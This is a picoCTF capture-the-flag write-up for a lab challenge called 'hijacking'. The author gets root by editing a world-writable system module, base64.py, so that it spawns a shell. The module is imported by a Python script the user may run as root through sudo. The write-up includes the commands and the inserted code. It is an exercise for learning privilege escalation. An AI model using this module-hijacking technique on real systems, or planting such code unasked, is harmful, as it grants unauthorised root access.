# hijacking
Challenge Description:
> Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Medium</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> Check for Hidden files
</details>
<details>
<summary>Hint 2</summary>

> No place like Home:)
</details>

(not gonna lie, I don't know what the second hint means)

## Procedure
When logging into the target and running `ls` there is nothing to be seen, but using the `-a` option reveals the Python file the description must be talking about. 
```
picoctf@challenge:~$ ls
picoctf@challenge:~$ ls -a
.  ..  .Xauthority  .bash_logout  .bashrc  .cache  .profile  .server.py
```
However, running it doesn't seem to do anything... So what is this file, anyway?
```
picoctf@challenge:~$ python3 .server.py
sh: 1: ping: not found
Traceback (most recent call last):
  File ".server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
picoctf@challenge:~$ cat .server.py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```
Okay... not very much in the way of useful information. Anyway, when faced with a challenge in which I have to remote into a target and interact with the shell, one command I like to run at the start is `sudo -l`, which shows what commands the user I'm logged in as can run as root.

```
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

Interestingly enough, we can run this (seemingly) useless Python file as root without even supplying a password. So how can we take advantage of it to gain root access to the flag, most likely stored at `/root/flag.txt`?
- Initially I thought about using my standard strategy of hijacking `PATH` to manipulate `.server.py` into running my own custom `ping` command, but it looks like `secure_path` is enforced in sudo-run commands on this machine. Therefore, that's not an option.

The key lies in how Python modules are written and imported. The statement `import base64` at the top of the Python file actual executes another Python file called `base64.py` located at `/lib/python3.8/base64.py`. In fact, you can find a bunch of Python modules in this folder, including the ones imported by `.server.py`.
```
picoctf@challenge:/lib/python3.8$ ls -l
total 4784
...
-rwxrwxrwx 1 root root  20382 May 26  2023 base64.py
...
-rw-r--r-- 1 root root  38995 May 26  2023 os.py
...
-rw-r--r-- 1 root root  35243 May 26  2023 socket.py
...
```
Funnily enough, `base64.py` is <i>writable</i> by everyone! So let's modify it to run whatever we desire at the top using `vim /lib/python3.8/base64.py`:
```
#! /usr/bin/python3.8

import os
os.system('sh')

"""Base16, Base32, Base64 (RFC 3548), Base85 and Ascii85 data encodings"""
```
And just like that, we have a root shell.
```
picoctf@challenge:~$ vim /lib/python3.8/base64.py
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
# whoami
root
# cd /root
# ls -a
.  ..  .bashrc  .flag.txt  .profile
# cat .flag.txt
hammy{u win - hammy}
```
## Solution
1. Edit the top (after the #! line) of `/lib/python3.8/base64.py` to run:
```python
import os
os.system('sh')
```
2. Run `sudo /usr/bin/python3 /home/picoctf/.server.py` to get the root shell.
3. Print the flag by running `cat /root/.flag.txt`.

## Key Takeaways
This was the first challenge that introduced Python libraries as a potential attack vector to me. I always like learning new methods of privilege escalation in the shell!